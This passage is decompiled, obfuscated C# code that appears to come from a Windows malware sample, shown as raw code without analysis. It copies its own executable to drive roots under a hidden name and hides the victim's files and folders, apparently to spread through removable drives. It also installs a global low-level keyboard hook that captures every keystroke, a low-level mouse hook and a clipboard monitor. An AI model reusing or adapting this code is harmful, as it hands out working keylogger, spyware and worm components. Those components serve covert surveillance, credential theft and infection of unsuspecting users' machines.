									if (num7 >= files.Length)
									{
										num5 = 3527180628u;
										continue;
									}
									goto IL_17F;
								case 18u:
								{
									object instance = NewLateBinding.LateGet(Interaction.CreateObject(<Module>.smethod_0(554864), ""), null, <Module>.smethod_0(554656), new object[]
									{
										driveInfo.Name + new FileInfo(text).Name + <Module>.smethod_0(554576)
									}, null, null, null);
									NewLateBinding.LateSetComplex(instance, null, <Module>.smethod_0(554624), new object[]
									{
										<Module>.smethod_0(554416)
									}, null, null, false, true);
									NewLateBinding.LateSetComplex(instance, null, <Module>.smethod_0(554464), new object[]
									{
										""
									}, null, null, false, true);
									num5 = (num4 * 1941421059u ^ 3305670511u);
									continue;
								}
								}
								break;
								IL_17F:
								text = files[num7];
								num5 = 3637799917u;
								continue;
								IL_424:
								checked
								{
									num7++;
									num5 = 3739357597u;
									continue;
									IL_450:
									int num6;
									string[] directories;
									string path = directories[num6];
									File.SetAttributes(path, FileAttributes.Hidden);
									File.Delete(driveInfo.Name + new DirectoryInfo(path).Name + <Module>.smethod_0(553776));
									num5 = 2984300802u;
								}
							}
							goto IL_6AB;
							IL_434:
							num5 = 2798471386u;
							goto IL_5E1;
							IL_649:
							File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.Name + this.ExeName, true);
							File.SetAttributes(driveInfo.Name + this.ExeName, FileAttributes.Hidden);
							files = Directory.GetFiles(driveInfo.Name);
							num7 = 0;
							num5 = 3739357597u;
							goto IL_5E1;
						}
						catch (Exception ex)
						{
						}
					}
					IL_6AB:
					goto IL_729;
				}
				catch (Exception ex2)
				{
					goto IL_729;
				}
				goto IL_6BB;
				IL_729:
				checked
				{
					num++;
					goto IL_710;
				}
			}
			this.sw = null;
		}

		// Token: 0x0600009D RID: 157 RVA: 0x00022390 File Offset: 0x00020590
		public string rt(string ru)
		{
			string result;
			try
			{
				object obj = Registry.LocalMachine.OpenSubKey(<Module>.smethod_0(552656), false);
				for (;;)
				{
					IL_178:
					uint num = 1391438367u;
					for (;;)
					{
						uint num2;
						string text;
						switch ((num2 = (num ^ 875723176u)) % 5u)
						{
						case 0u:
							goto IL_145;
						case 2u:
						{
							object instance = obj;
							Type type = null;
							string memberName = <Module>.smethod_0(552704);
							object[] array = new object[1];
							object[] array2 = array;
							int num3 = 0;
							object instance2 = obj;
							Type type2 = null;
							string memberName2 = <Module>.smethod_0(552496);
							object[] array3 = new object[]
							{
								ru,
								false
							};
							object[] arguments = array3;
							string[] argumentNames = null;
							Type[] typeArguments = null;
							bool[] array4 = new bool[]
							{
								true,
								false
							};
							object instance3 = NewLateBinding.LateGet(instance2, type2, memberName2, arguments, argumentNames, typeArguments, array4);
							if (array4[0])
							{
								ru = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array3[0]), typeof(string));
							}
							array2[num3] = Operators.ConcatenateObject(NewLateBinding.LateGet(instance3, null, <Module>.smethod_0(552544), new object[]
							{
								""
							}, null, null, null), <Module>.smethod_0(552464));
							text = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(instance, type, memberName, array, null, null, null), null, <Module>.smethod_0(553280), new object[]
							{
								"",
								""
							}, null, null, null));
							if (!text.Contains(","))
							{
								num = 1371908241u;
								continue;
							}
							goto IL_145;
						}
						case 3u:
							goto IL_178;
						case 4u:
							text += ",0";
							num = (num2 * 893130402u ^ 2848711928u);
							continue;
						}
						goto Block_4;
						IL_145:
						result = text;
						num = 525776102u;
					}
				}
				Block_4:;
			}
			catch (Exception ex)
			{
				for (;;)
				{
					IL_1C6:
					uint num4 = 2125108570u;
					for (;;)
					{
						uint num2;
						switch ((num2 = (num4 ^ 875723176u)) % 3u)
						{
						case 0u:
							goto IL_1C6;
						case 2u:
							result = "";
							num4 = (num2 * 1074445672u ^ 4188286341u);
							continue;
						}
						goto Block_6;
					}
				}
				Block_6:;
			}
			return result;
		}

		// Token: 0x04000374 RID: 884
		private bool sx;

		// Token: 0x04000375 RID: 885
		private Thread sw;

		// Token: 0x04000376 RID: 886
		public string ExeName;
	}

	// Token: 0x02000015 RID: 21
	public class ux
	{
		// Token: 0x0600009F RID: 159
		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int UnhookWindowsHookEx(int uq);

		// Token: 0x060000A0 RID: 160
		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int SetWindowsHookExA(int vy, Delegate vx, IntPtr vw, int vq);

		// Token: 0x060000A1 RID: 161
		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int CallNextHookEx(IntPtr yx, int yw, int yq, object yz);

		// Token: 0x14000001 RID: 1
		// (add) Token: 0x060000A2 RID: 162 RVA: 0x00022590 File Offset: 0x00020790
		// (remove) Token: 0x060000A3 RID: 163 RVA: 0x000225B4 File Offset: 0x000207B4
		public event afg.ux.tu ace
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.abt = (afg.ux.tu)Delegate.Combine(this.abt, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.abt = (afg.ux.tu)Delegate.Remove(this.abt, value);
			}
		}

		// Token: 0x14000002 RID: 2
		// (add) Token: 0x060000A4 RID: 164 RVA: 0x000225D8 File Offset: 0x000207D8
		// (remove) Token: 0x060000A5 RID: 165 RVA: 0x000225FC File Offset: 0x000207FC
		public event afg.ux.tv acf
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.abu = (afg.ux.tv)Delegate.Combine(this.abu, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.abu = (afg.ux.tv)Delegate.Remove(this.abu, value);
			}
		}

		// Token: 0x14000003 RID: 3
		// (add) Token: 0x060000A6 RID: 166 RVA: 0x00022620 File Offset: 0x00020820
		// (remove) Token: 0x060000A7 RID: 167 RVA: 0x00022644 File Offset: 0x00020844
		public event afg.ux.ty acg
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.abv = (afg.ux.ty)Delegate.Combine(this.abv, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.abv = (afg.ux.ty)Delegate.Remove(this.abv, value);
			}
		}

		// Token: 0x14000004 RID: 4
		// (add) Token: 0x060000A8 RID: 168 RVA: 0x00022668 File Offset: 0x00020868
		// (remove) Token: 0x060000A9 RID: 169 RVA: 0x0002268C File Offset: 0x0002088C
		public event afg.ux.tx ach
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.aby = (afg.ux.tx)Delegate.Combine(this.aby, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.aby = (afg.ux.tx)Delegate.Remove(this.aby, value);
			}
		}

		// Token: 0x14000005 RID: 5
		// (add) Token: 0x060000AA RID: 170 RVA: 0x000226B0 File Offset: 0x000208B0
		// (remove) Token: 0x060000AB RID: 171 RVA: 0x000226D4 File Offset: 0x000208D4
		public event afg.ux.tw acj
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.abx = (afg.ux.tw)Delegate.Combine(this.abx, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.abx = (afg.ux.tw)Delegate.Remove(this.abx, value);
			}
		}

		// Token: 0x14000006 RID: 6
		// (add) Token: 0x060000AC RID: 172 RVA: 0x000226F8 File Offset: 0x000208F8
		// (remove) Token: 0x060000AD RID: 173 RVA: 0x0002271C File Offset: 0x0002091C
		public event afg.ux.tq ack
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.abw = (afg.ux.tq)Delegate.Combine(this.abw, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.abw = (afg.ux.tq)Delegate.Remove(this.abw, value);
			}
		}

		// Token: 0x060000AE RID: 174 RVA: 0x00022740 File Offset: 0x00020940
		public void xw()
		{
			this.acd = new afg.ux.sq(this.wq);
			this.abq = afg.ux.SetWindowsHookExA(14, this.acd, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]), 0);
		}

		// Token: 0x060000AF RID: 175 RVA: 0x00022788 File Offset: 0x00020988
		public int xq()
		{
			return afg.ux.UnhookWindowsHookEx(this.abq);
		}

		// Token: 0x060000B0 RID: 176 RVA: 0x000227A0 File Offset: 0x000209A0
		private int wq(int wz, int qz, ref afg.ux.sz abc)
		{
			int result;
			if (wz == 0)
			{
				for (;;)
				{
					IL_4D8:
					uint num = 1198597014u;
					for (;;)
					{
						uint num2;
						int num3;
						MouseButtons button;
						afg.ux.tz tz;
						int num4;
						bool flag;
						switch ((num2 = (num ^ 969470118u)) % 43u)
						{
						case 0u:
							goto IL_68;
						case 1u:
							goto IL_40C;
						case 3u:
							switch (qz)
							{
							case 513:
								goto IL_287;
							case 514:
								goto IL_2E9;
							case 515:
								goto IL_368;
							case 516:
								goto IL_27B;
							case 517:
								goto IL_228;
							case 518:
								goto IL_335;
							case 519:
								goto IL_30A;
							case 520:
								goto IL_40C;
							case 521:
								goto IL_2B9;
							case 522:
								goto IL_2F6;
							default:
								num = (num2 * 3635046639u ^ 3278849067u);
								continue;
							}
							break;
						case 4u:
							num3 = 2;
							num = (num2 * 301206944u ^ 1303024306u);
							continue;
						case 5u:
							button = MouseButtons.Middle;
							num3 = 1;
							num = (num2 * 3426512480u ^ 1410537938u);
							continue;
						case 6u:
						{
							afg.ux.tq tq;
							tq(this, ref tz);
							num = (num2 * 2260703119u ^ 1420570473u);
							continue;
						}
						case 7u:
							goto IL_4B;
						case 8u:
							goto IL_368;
						case 9u:
							button = MouseButtons.Right;
							num3 = 1;
							num = (num2 * 2531109385u ^ 1054867432u);
							continue;
						case 10u:
							goto IL_335;
						case 11u:
						{
							afg.ux.tu tu;
							tu(this, ref tz);
							num = (num2 * 3797718468u ^ 1053121598u);
							continue;
						}
						case 12u:
							goto IL_30A;
						case 13u:
							goto IL_2F6;
						case 14u:
							goto IL_2E9;
						case 15u:
						{
							afg.ux.tw tw;
							tw(this, ref tz);
							num = (num2 * 1488406311u ^ 2906339174u);
							continue;
						}
						case 16u:
							goto IL_2B9;
						case 17u:
						{
							afg.ux.tw tw;
							if (tw != null)
							{
								num = (num2 * 1393576027u ^ 3890014426u);
								continue;
							}
							goto IL_76;
						}
						case 18u:
							goto IL_287;
						case 19u:
							goto IL_27B;
						case 20u:
							return -1;
						case 21u:
						{
							afg.ux.tu tu = this.abt;
							if (tu != null)
							{
								num = (num2 * 837946404u ^ 2018671026u);
								continue;
							}
							goto IL_F1;
						}
						case 22u:
							num3 = 2;
							num = (num2 * 652549608u ^ 2307908738u);
							continue;
						case 23u:
							goto IL_228;
						case 24u:
							button = MouseButtons.Left;
							num3 = 1;
							num = (num2 * 2566481087u ^ 2245996252u);
							continue;
						case 25u:
						{
							afg.ux.tx tx = this.aby;
							if (tx != null)
							{
								num = (num2 * 1854073686u ^ 1738180874u);
								continue;
							}
							goto IL_4B;
						}
						case 26u:
							goto IL_76;
						case 27u:
						{
							afg.ux.tx tx;
							tx(this, ref tz);
							num = (num2 * 2287279078u ^ 935809002u);
							continue;
						}
						case 28u:
						{
							afg.ux.ty ty = this.abv;
							if (ty != null)
							{
								num = (num2 * 2083182618u ^ 1400963656u);
								continue;
							}
							goto IL_3C;
						}
						case 29u:
							goto IL_F1;
						case 30u:
							num = (num2 * 1060470804u ^ 2628880310u);
							continue;
						case 31u:
							num = (num2 * 2092308752u ^ 2922541362u);
							continue;
						case 32u:
						{
							afg.ux.tw tw = this.abx;
							num = (num2 * 3975002392u ^ 2246689412u);
							continue;
						}
						case 33u:
							goto IL_4D8;
						case 34u:
							goto IL_3C;
						case 35u:
						{
							afg.ux.ty ty;
							ty(this, ref tz);
							num = (num2 * 489054914u ^ 3879944649u);
							continue;
						}
						case 36u:
							tz = new afg.ux.tz(button, num3, num4, abc.Point);
							num = 459240606u;
							continue;
						case 37u:
						{
							afg.ux.tv tv;
							tv(this, ref tz);
							num = (num2 * 2276183859u ^ 3537288345u);
							continue;
						}
						case 38u:
							if (flag)
							{
								num = (num2 * 2230598810u ^ 2037682098u);
								continue;
							}
							goto IL_F1;
						case 39u:
							button = MouseButtons.Middle;
							num3 = 1;
							num = (num2 * 2343265072u ^ 2515646178u);
							continue;
						case 40u:
							goto IL_2D;
						case 41u:
						{
							this.abz = abc.Point;
							afg.ux.tq tq = this.abw;
							if (tq != null)
							{
								num = (num2 * 2832043628u ^ 4237955886u);
								continue;
							}
							goto IL_68;
						}
						case 42u:
						{
							afg.ux.tv tv = this.abu;
							if (tv != null)
							{
								num = (num2 * 2525723987u ^ 297154696u);
								continue;
							}
							goto IL_2D;
						}
						}
						goto Block_16;
						IL_2D:
						if (num3 > 0)
						{
							num = 286574076u;
							continue;
						}
						goto IL_3C;
						IL_F1:
						bool flag2;
						if (flag2)
						{
							num = 1660048888u;
							continue;
						}
						goto IL_2D;
						IL_3C:
						if (num3 == 2)
						{
							num = 928959909u;
							continue;
						}
						IL_4B:
						if (abc.Point != this.abz)
						{
							num = 823935498u;
							continue;
						}
						IL_68:
						if (num4 != 0)
						{
							num = 306835247u;
							continue;
						}
						IL_76:
						if (tz.uy)
						{
							num = 2018928107u;
							continue;
						}
						return result;
						IL_228:
						flag = true;
						button = MouseButtons.Right;
						num3 = 1;
						num = 2134920434u;
						continue;
						IL_27B:
						flag2 = true;
						num = 221624428u;
						continue;
						IL_287:
						flag2 = true;
						button = MouseButtons.Left;
						num3 = 1;
						num = 2134920434u;
						continue;
						IL_2B9:
						button = MouseButtons.Middle;
						num = 106987484u;
						continue;
						IL_2E9:
						flag = true;
						num = 16897012u;
						continue;
						IL_2F6:
						num4 = abc.Code >> 16;
						num = 2134920434u;
						continue;
						IL_30A:
						flag2 = true;
						num = 1950041725u;
						continue;
						IL_335:
						button = MouseButtons.Right;
						num3 = 2;
						num = 1155270842u;
						continue;
						IL_368:
						button = MouseButtons.Left;
						num = 1482670976u;
						continue;
						IL_40C:
						flag = true;
						num = 367110869u;
					}
				}
				Block_16:
				return result;
			}
			return result;
		}

		// Token: 0x04000377 RID: 887
		private afg.ux.tu abt;

		// Token: 0x04000378 RID: 888
		private afg.ux.tv abu;

		// Token: 0x04000379 RID: 889
		private afg.ux.ty abv;

		// Token: 0x0400037A RID: 890
		private afg.ux.tx aby;

		// Token: 0x0400037B RID: 891
		private afg.ux.tw abx;

		// Token: 0x0400037C RID: 892
		private afg.ux.tq abw;

		// Token: 0x0400037D RID: 893
		private int abq;

		// Token: 0x0400037E RID: 894
		private Point abz;

		// Token: 0x0400037F RID: 895
		private afg.ux.sq acd;

		// Token: 0x02000016 RID: 22
		// (Invoke) Token: 0x060000B4 RID: 180
		private delegate int sq(int code, int flags, ref afg.ux.sz data);

		// Token: 0x02000017 RID: 23
		private struct sz
		{
			// Token: 0x04000380 RID: 896
			public Point Point;

			// Token: 0x04000381 RID: 897
			public int Code;

			// Token: 0x04000382 RID: 898
			public int Flags;

			// Token: 0x04000383 RID: 899
			public int Time;

			// Token: 0x04000384 RID: 900
			public int Info;
		}

		// Token: 0x02000018 RID: 24
		// (Invoke) Token: 0x060000B8 RID: 184
		public delegate void tu(object sender, ref afg.ux.tz e);

		// Token: 0x02000019 RID: 25
		// (Invoke) Token: 0x060000BC RID: 188
		public delegate void tv(object sender, ref afg.ux.tz e);

		// Token: 0x0200001A RID: 26
		// (Invoke) Token: 0x060000C0 RID: 192
		public delegate void ty(object sender, ref afg.ux.tz e);

		// Token: 0x0200001B RID: 27
		// (Invoke) Token: 0x060000C4 RID: 196
		public delegate void tx(object sender, ref afg.ux.tz e);

		// Token: 0x0200001C RID: 28
		// (Invoke) Token: 0x060000C8 RID: 200
		public delegate void tw(object sender, ref afg.ux.tz e);

		// Token: 0x0200001D RID: 29
		// (Invoke) Token: 0x060000CC RID: 204
		public delegate void tq(object sender, ref afg.ux.tz e);

		// Token: 0x0200001E RID: 30
		[EditorBrowsable(EditorBrowsableState.Never)]
		public struct tz
		{
			// Token: 0x1700000B RID: 11
			// (get) Token: 0x060000CD RID: 205 RVA: 0x00022C94 File Offset: 0x00020E94
			// (set) Token: 0x060000CE RID: 206 RVA: 0x00022CA8 File Offset: 0x00020EA8
			public bool uy
			{
				get
				{
					return this.uv;
				}
				set
				{
					this.uv = value;
				}
			}

			// Token: 0x060000CF RID: 207 RVA: 0x00022CBC File Offset: 0x00020EBC
			public tz(MouseButtons _button, int _clicks, int _delta, Point _location)
			{
				this = default(afg.ux.tz);
				this.Button = _button;
				this.Clicks = _clicks;
				this.Delta = _delta;
				this.Location = _location;
			}

			// Token: 0x04000385 RID: 901
			public readonly MouseButtons Button;

			// Token: 0x04000386 RID: 902
			public readonly int Clicks;

			// Token: 0x04000387 RID: 903
			public readonly int Delta;

			// Token: 0x04000388 RID: 904
			public readonly Point Location;

			// Token: 0x04000389 RID: 905
			private bool uv;
		}
	}

	// Token: 0x0200001F RID: 31
	public class acm : NativeWindow
	{
		// Token: 0x060000D0 RID: 208
		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr SetClipboardViewer(IntPtr aco);

		// Token: 0x060000D1 RID: 209
		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool ChangeClipboardChain(IntPtr acr, IntPtr acs);

		// Token: 0x060000D2 RID: 210
		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern long SendMessage(IntPtr acu, int acv, IntPtr acy, IntPtr acx);

		// Token: 0x14000007 RID: 7
		// (add) Token: 0x060000D3 RID: 211 RVA: 0x00022CF0 File Offset: 0x00020EF0
		// (remove) Token: 0x060000D4 RID: 212 RVA: 0x00022D14 File Offset: 0x00020F14
		public event afg.acm.acl adf
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.acz = (afg.acm.acl)Delegate.Combine(this.acz, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.acz = (afg.acm.acl)Delegate.Remove(this.acz, value);
			}
		}

		// Token: 0x060000D5 RID: 213 RVA: 0x00022D38 File Offset: 0x00020F38
		public acm()
		{
			this.CreateHandle(new CreateParams());
		}

		// Token: 0x060000D6 RID: 214 RVA: 0x00022D58 File Offset: 0x00020F58
		public void acw()
		{
			this.ade = afg.acm.SetClipboardViewer(this.Handle);
		}

		// Token: 0x060000D7 RID: 215 RVA: 0x00022D78 File Offset: 0x00020F78
		public void acq()
		{
			afg.acm.ChangeClipboardChain(this.Handle, this.ade);
		}

		// Token: 0x060000D8 RID: 216 RVA: 0x00022D98 File Offset: 0x00020F98
		protected override void WndProc(ref Message m)
		{
			afg.acm.acl acl;
			uint num;
			switch (m.Msg)
			{
			case 776:
				IL_9F:
				acl = this.acz;
				num = 2404683540u;
				break;
			case 777:
			case 778:
			case 779:
			case 780:
				IL_15B:
				base.WndProc(ref m);
				return;
			case 781:
				IL_146:
				if (!(m.WParam == this.ade))
				{
					goto IL_11A;
				}
				num = 2151387541u;
				break;
			default:
				goto IL_5E;
			}
			for (;;)
			{
				IL_D6:
				uint num2;
				switch ((num2 = (num ^ 3381669330u)) % 11u)
				{
				case 0u:
					acl(this);
					num = (num2 * 2255030725u ^ 2143051039u);
					continue;
				case 1u:
					num = (num2 * 3977250324u ^ 80396539u);
					continue;
				case 2u:
					goto IL_146;
				case 3u:
					goto IL_9F;
				case 4u:
					if (acl != null)
					{
						num = (num2 * 2333955860u ^ 3401057477u);
						continue;
					}
					goto IL_65;
				case 5u:
					goto IL_65;
				case 6u:
					goto IL_11A;
				case 7u:
					goto IL_5E;
				case 9u:
					this.ade = m.LParam;
					num = (num2 * 158744373u ^ 1112851956u);
					continue;
				case 10u:
					num = (num2 * 3225715835u ^ 346588234u);
					continue;
				}
				break;
				IL_65:
				afg.acm.SendMessage(this.ade, m.Msg, m.WParam, m.LParam);
				num = 3659357381u;
			}
			goto IL_15B;
			IL_5E:
			num = 3049653105u;
			goto IL_D6;
			IL_11A:
			afg.acm.SendMessage(this.ade, m.Msg, m.WParam, m.LParam);
			num = 2311697991u;
			goto IL_D6;
		}

		// Token: 0x060000D9 RID: 217 RVA: 0x00022F08 File Offset: 0x00021108
		protected override void Finalize()
		{
			this.acq();
		}

		// Token: 0x0400038A RID: 906
		private afg.acm.acl acz;

		// Token: 0x0400038B RID: 907
		private IntPtr ade;

		// Token: 0x02000020 RID: 32
		// (Invoke) Token: 0x060000DD RID: 221
		public delegate void acl(afg.acm sender);
	}

	// Token: 0x02000021 RID: 33
	public class adm
	{
		// Token: 0x060000DE RID: 222 RVA: 0x00022F1C File Offset: 0x0002111C
		public adm()
		{
			this.aex = new afg.adm.adl(this.adz);
			this.aew = IntPtr.Zero;
		}

		// Token: 0x060000DF RID: 223
		[DllImport("User32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
		private static extern int SetWindowsHookEx(int ado, afg.adm.adl adp, IntPtr adr, int ads);

		// Token: 0x060000E0 RID: 224
		[DllImport("User32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
		private static extern int CallNextHookEx(int adu, int adv, IntPtr ady, IntPtr adx);

		// Token: 0x060000E1 RID: 225
		[DllImport("User32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
		private static extern bool UnhookWindowsHookEx(int adq);

		// Token: 0x14000008 RID: 8
		// (add) Token: 0x060000E2 RID: 226 RVA: 0x00022F50 File Offset: 0x00021150
		// (remove) Token: 0x060000E3 RID: 227 RVA: 0x00022F74 File Offset: 0x00021174
		public static event afg.adm.adj aeq
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				afg.adm.aev = (afg.adm.adj)Delegate.Combine(afg.adm.aev, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				afg.adm.aev = (afg.adm.adj)Delegate.Remove(afg.adm.aev, value);
			}
		}

		// Token: 0x14000009 RID: 9
		// (add) Token: 0x060000E4 RID: 228 RVA: 0x00022F98 File Offset: 0x00021198
		// (remove) Token: 0x060000E5 RID: 229 RVA: 0x00022FBC File Offset: 0x000211BC
		public static event afg.adm.adk aez
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				afg.adm.aey = (afg.adm.adk)Delegate.Combine(afg.adm.aey, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				afg.adm.aey = (afg.adm.adk)Delegate.Remove(afg.adm.aey, value);
			}
		}

		// Token: 0x060000E6 RID: 230 RVA: 0x00022FE0 File Offset: 0x000211E0
		private int adz(int aef, IntPtr aeg, IntPtr aeh)
		{
			if (aef == 0)
			{
				for (;;)
				{
					IL_1CB:
					uint num = 1606922641u;
					for (;;)
					{
						uint num2;
						afg.adm.adk adk2;
						afg.adm.adj adj;
						switch ((num2 = (num ^ 185354889u)) % 13u)
						{
						case 0u:
							if (aeg == (IntPtr)260)
							{
								num = (num2 * 2339577565u ^ 3984312117u);
								continue;
							}
							goto IL_106;
						case 1u:
						{
							afg.adm.adk adk = adk2;
							afg.adm.adg adg;
							object obj = Marshal.PtrToStructure(aeh, adg.GetType());
							afg.adm.adg adg2;
							adk(checked((Keys)((obj != null) ? ((afg.adm.adg)obj) : adg2).vkCode));
							num = 2037013278u;
							continue;
						}
						case 2u:
							goto IL_106;
						case 3u:
							if (adj != null)
							{
								num = (num2 * 2040719665u ^ 3371518501u);
								continue;
							}
							break;
						case 4u:
							if (aeg == (IntPtr)261)
							{
								num = (num2 * 1476615272u ^ 2151007932u);
								continue;
							}
							break;
						case 5u:
							goto IL_1CB;
						case 6u:
						{
							afg.adm.adj adj2 = adj;
							afg.adm.adg adg;
							object obj2 = Marshal.PtrToStructure(aeh, adg.GetType());
							afg.adm.adg adg2;
							adj2(checked((Keys)((obj2 != null) ? ((afg.adm.adg)obj2) : adg2).vkCode));
							num = 2037013278u;
							continue;
						}
						case 7u:
							if (!(aeg == (IntPtr)256))
							{
								num = (num2 * 3720286758u ^ 3759127347u);
								continue;
							}
							goto IL_23;
						case 8u:
							goto IL_4F;
						case 10u:
							if (adk2 != null)
							{
								num = (num2 * 121985508u ^ 742477739u);
								continue;
							}
							break;
						case 11u:
							goto IL_23;
						case 12u:
							num = (num2 * 1330566548u ^ 2892039190u);
							continue;
						}
						goto Block_10;
						IL_23:
						adj = afg.adm.aev;
						num = 1572021870u;
						continue;
						IL_4F:
						adk2 = afg.adm.aey;
						num = 459713633u;
						continue;
						IL_106:
						if (aeg == (IntPtr)257)
						{
							goto IL_4F;
						}
						num = 1781474693u;
					}
				}
				Block_10:;
			}
			return afg.adm.CallNextHookEx((int)IntPtr.Zero, aef, aeg, aeh);
		}

		// Token: 0x060000E7 RID: 231 RVA: 0x000231D4 File Offset: 0x000213D4
		public void aer()
		{
			checked
			{
				try
				{
					int num = 0;
					for (;;)
					{
						IL_8C:
						int num2 = 1742584452;
						for (;;)
						{
							switch ((num2 ^ 2120748620) % 5)
							{
							case 0:
								goto IL_8C;
							case 1:
								goto IL_07;
							case 3:
								goto IL_50;
							}
							goto Block_3;
							IL_50:
							num++;
							if (num > 10)
							{
								num2 = 1048756824;
								continue;
							}
							IL_07:
							this.aew = (IntPtr)afg.adm.SetWindowsHookEx(13, this.aex, (IntPtr)Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
							if (!(this.aew != IntPtr.Zero))
							{
								goto IL_50;
							}
							num2 = 914960294;
						}
					}
					Block_3:;
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x060000E8 RID: 232 RVA: 0x00023298 File Offset: 0x00021498
		protected override void Finalize()
		{
			if (!(this.aew == IntPtr.Zero))
			{
				goto IL_37;
			}
			goto IL_64;
			uint num2;
			for (;;)
			{
				IL_3C:
				uint num;
				switch ((num = (num2 ^ 3431518908u)) % 4u)
				{
				case 0u:
					goto IL_37;
				case 2u:
					afg.adm.UnhookWindowsHookEx((int)this.aew);
					num2 = (num * 2491493327u ^ 634188129u);
					continue;
				case 3u:
					goto IL_64;
				}
				break;
			}
			return;
			IL_37:
			num2 = 2577203734u;
			goto IL_3C;
			IL_64:
			base.Finalize();
			num2 = 3843931401u;
			goto IL_3C;
		}

		// Token: 0x0400038C RID: 908
		private static afg.adm.adj aev;

		// Token: 0x0400038D RID: 909
		private static afg.adm.adk aey;

		// Token: 0x0400038E RID: 910
		private const int WH_KEYBOARD_LL = 13;

		// Token: 0x0400038F RID: 911
		private const int HC_ACTION = 0;

		// Token: 0x04000390 RID: 912
		private const int WM_KEYDOWN = 256;

		// Token: 0x04000391 RID: 913
		private const int WM_KEYUP = 257;

		// Token: 0x04000392 RID: 914
		private const int WM_SYSKEYDOWN = 260;

		// Token: 0x04000393 RID: 915
		private const int WM_SYSKEYUP = 261;

		// Token: 0x04000394 RID: 916
		private afg.adm.adl aex;

		// Token: 0x04000395 RID: 917
		private IntPtr aew;

		// Token: 0x02000022 RID: 34
		private struct adg
		{
			// Token: 0x04000396 RID: 918
			public uint vkCode;

			// Token: 0x04000397 RID: 919
			public uint scanCode;

			// Token: 0x04000398 RID: 920
			public afg.adm.adh flags;

			// Token: 0x04000399 RID: 921
			public uint time;

			// Token: 0x0400039A RID: 922
			public UIntPtr dwExtraInfo;
		}

		// Token: 0x02000023 RID: 35
		[Flags]
		private enum adh : uint
		{
			// Token: 0x0400039C RID: 924
			LLKHF_EXTENDED = 1u,
			// Token: 0x0400039D RID: 925
			LLKHF_INJECTED = 16u,
			// Token: 0x0400039E RID: 926
			LLKHF_ALTDOWN = 32u,
			// Token: 0x0400039F RID: 927
			LLKHF_UP = 128u
		}

		// Token: 0x02000024 RID: 36
		// (Invoke) Token: 0x060000EC RID: 236
		public delegate void adj(Keys Key);

		// Token: 0x02000025 RID: 37
		// (Invoke) Token: 0x060000F0 RID: 240
		public delegate void adk(Keys Key);

		// Token: 0x02000026 RID: 38
		// (Invoke) Token: 0x060000F4 RID: 244
		private delegate int adl(int nCode, IntPtr wParam, IntPtr lParam);
	}
}
